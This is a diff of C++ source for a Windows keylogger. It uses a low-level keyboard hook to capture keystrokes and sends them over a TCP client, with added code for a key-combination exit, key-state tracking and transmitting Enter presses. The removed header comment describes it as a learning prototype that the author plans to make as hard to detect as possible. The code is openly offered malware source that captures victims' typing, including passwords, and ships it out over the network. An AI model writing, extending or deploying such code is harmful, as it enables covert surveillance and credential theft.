@@ -1,8 +1,5 @@
 /**
         KEYLOGGER
-    - Prototype keylogger, focused on learning how windows lower level programming works.
-    - Will try to rewrite in C and make it as hard to detect as possible later on.
-    - Main components - FILE I/O, Capturing keyboard input, sending TCP requests.
     @author EP
 **/
 #include <iostream>
@@ -37,9 +34,15 @@ int cpsLock = -1;
 
 
 bool dataReady = false;
+bool quitSig = false;
 
-
-
+void cleanUp()
+{
+    wcout<<"[KEYLOGGER] Exiting..."<<endl;
+    newClient->closeConnection();
+    UnhookWindowsHookEx(keyboardHook);
+    exit(0);
+}
 // callback function for LL keyboard hook
 LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
 {
@@ -58,10 +61,18 @@ LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
             break;
         case VK_RMENU:
             wcout<<"[RALT UP]"<<endl;
+            keyState[VK_RMENU] = 0;
+            break;
+        case VK_BACK:
+            keyState[VK_BACK] = 0;
+            wcout<<"[BACKSPACE UP]"<<endl;
+            break;
+        case VK_PRIOR:
+            keyState[VK_PRIOR] = 0;
+            wcout<<"[P]"<<endl;
             break;
         default:
             break;
-
         }
     }
 
@@ -82,6 +93,8 @@ LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
             break;
         case VK_RMENU:
             wcout<<"[RALT DOWN]"<<endl;
+            keyState[VK_RMENU] = 0x80;
+            if ((keyState[VK_TAB] & 0x80) && (keyState[VK_BACK] & 0x80) && (keyState[VK_RMENU] & 0x80)){cleanUp();}
             break;
         case VK_CAPITAL:
             wcout<<"[CAPS]"<<endl;
@@ -89,7 +102,16 @@ LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
             keyState[VK_CAPITAL] = cpsLock * 0x80;
             break;
         case VK_BACK:
+            keyState[VK_BACK] = 0x80;
             wcout<<"[BACKSPACE]"<<endl;
+            if ((keyState[VK_TAB] & 0x80) && (keyState[VK_BACK] & 0x80) && (keyState[VK_RMENU] & 0x80)){ cleanUp();}
+            break;
+        case VK_PRIOR:         
+            keyState[VK_PRIOR] = 0x80;
+            if ((keyState[VK_PRIOR] & 0x80) && (keyState[VK_BACK] & 0x80) && (keyState[VK_RMENU] & 0x80)){cleanUp();} 
+            break;
+        case VK_RETURN:
+            newClient->transmitData("\n");
             break;
         default:
             HKL keyboardLayout = GetKeyboardLayout(0);
@@ -127,11 +149,12 @@ int main()
 
     //main message loop, does not occupy 100% CPU :D
     while(GetMessage(&msg, NULL, 0, 0))
-    {
+    {   
+        wcout<<"Keylogger"<<endl;
         TranslateMessage(&msg);
         DispatchMessage(&msg);
     }
-
-    UnhookWindowsHookEx(keyboardHook);
+    
+    
     return 0;
 }
